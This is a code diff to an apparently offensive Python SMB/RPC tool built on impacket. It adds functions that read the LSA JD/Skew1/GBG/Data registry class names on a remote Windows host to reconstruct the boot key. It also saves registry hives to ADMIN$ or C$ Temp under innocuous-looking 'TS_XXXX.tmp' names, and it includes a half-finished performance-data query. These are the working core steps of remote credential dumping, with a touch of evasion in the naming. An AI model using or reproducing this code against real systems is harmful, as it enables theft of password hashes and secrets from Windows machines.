@@ -1,8 +1,9 @@
+import string
 from impacket.dcerpc.v5 import transport, rrp, srvs, wkst, tsch, scmr, rpcrt
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY
 from impacket.dcerpc.v5.tsch import TASK_FLAG_HIDDEN
-import os, traceback
+import os
 from slingerpkg.utils.printlib import *
 from slingerpkg.utils.common import *
 from impacket.structure import hexdump
@@ -10,7 +11,9 @@ from struct import unpack, pack
 from impacket.system_errors import ERROR_NO_MORE_ITEMS
 from impacket.dcerpc.v5.dtypes import READ_CONTROL
 import sys
-
+from slingerpkg.lib.msrpcperformance import *
+from impacket.dcerpc.v5.rrp import DCERPCSessionError
+from impacket import system_errors, LOG
 
 def parse_lp_data(valueType, valueData, hex_dump=True):
     result = ""
@@ -71,6 +74,7 @@ class DCETransport:
         self.winregSetupComplete = False
         self.rrpshouldStop = False
         self.rrpstarted = False
+        self.share = None
 
     def _bind(self, bind_uuid):
         #retrieve plaintext from uuids
@@ -399,6 +403,56 @@ class DCETransport:
                                          dwServiceType=scmr.SERVICE_WIN32_OWN_PROCESS, dwErrorControl=scmr.SERVICE_ERROR_IGNORE, lpBinaryPathName=bin_path, dwStartType=start_type)
         return response
 
+    def _get_boot_key(self):
+        bootKey = b''
+        self.bind_override = True
+        self._bind(rrp.MSRPC_UUID_RRP)
+        ans = rrp.hOpenLocalMachine(self.dce)
+        regHandle = ans['phKey']
+        for key in ['JD','Skew1','GBG','Data']:
+            print_debug(f"Opening 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\{key}'")
+            ans = rrp.hBaseRegOpenKey(self.dce, regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
+            keyHandle = ans['phkResult']
+            ans = rrp.hBaseRegQueryInfoKey(self.dce,keyHandle)
+            # bootKey = bootKey + b(ans['lpClassOut'][:-1])
+            bootKey = bootKey + bytes(ans['lpClassOut'][:-1], 'utf-8')
+            rrp.hBaseRegCloseKey(self.dce, keyHandle)
+        return bootKey
+
+    def _save_hive(self, hiveName):
+        self.bind_override = True
+        self._bind(rrp.MSRPC_UUID_RRP)
+        #tmpFileName = ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.tmp'
+        # TS_57CB.tmp pattern
+        tmpFileName = 'TS_' + ''.join([random.choice(string.ascii_uppercase + string.digits) for _ in range(4)]) + '.tmp'
+        ans = rrp.hOpenLocalMachine(self.dce)
+        regHandle = ans['phKey']
+        try:
+            ans = rrp.hBaseRegCreateKey(self.dce, regHandle, hiveName)
+        except:
+            raise Exception("Can't open %s hive" % hiveName)
+        keyHandle = ans['phkResult']
+        savePath = ""
+        absPath = ""
+        if self.share.upper() == "ADMIN$":
+            absPath = "ADMIN$" + "\\Temp\\" + tmpFileName
+            savePath = "..\\Temp\\" + tmpFileName
+        elif self.share.upper() == "C$":
+            absPath = "C$" + "\\Windows\\Temp\\" + tmpFileName
+            savePath = "\\Windows\\Temp\\" + tmpFileName
+
+        try:
+            ans = rrp.hBaseRegSaveKey(self.dce, keyHandle, savePath)
+        except Exception as e:
+            print_debug(str(e), sys.exc_info())
+            if "ERROR_PATH_NOT_FOUND" in str(e):
+                print_bad("Unable to save hive, path not found")
+            return None
+        rrp.hBaseRegCloseKey(self.dce, keyHandle)
+        rrp.hBaseRegCloseKey(self.dce, regHandle)
+
+        return tmpFileName
+
     def _get_root_key(self, keyName):
         # Let's strip the root key
         try:
@@ -597,3 +651,24 @@ class DCETransport:
         else:
             print_debug('Error 0x%08x while creating key %s' % (ans2['ErrorCode'], keyName))
             return False
+        
+    def _reg_query_perf_data(self):
+        
+        result = {}
+        if not self.is_connected:
+            raise Exception("Not connected to remote host")
+        self.bind_override = True
+        self._bind(rrp.MSRPC_UUID_RRP)
+
+        # Open Performance Data
+        openhkpd_result = rrp.hOpenPerformanceData(self.dce, samDesired=rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS | rrp.KEY_QUERY_VALUE | rrp.KEY_READ)
+        #openhkpd_result.dump()
+        ans = rrp.hBaseRegQueryValue(self.dce, openhkpd_result['phKey'], lpValueName="Counter 009")
+        result['title-database'] = parse_perf_title_data(ans[1])
+        counter_ID = result['title-database']['Process']
+        queryvalue_result = rrp.hBaseRegQueryValue(self.dce, openhkpd_result['phKey'], lpValueName="238")
+        queryvalue_result.dump()
+        
+        return ans
+
+
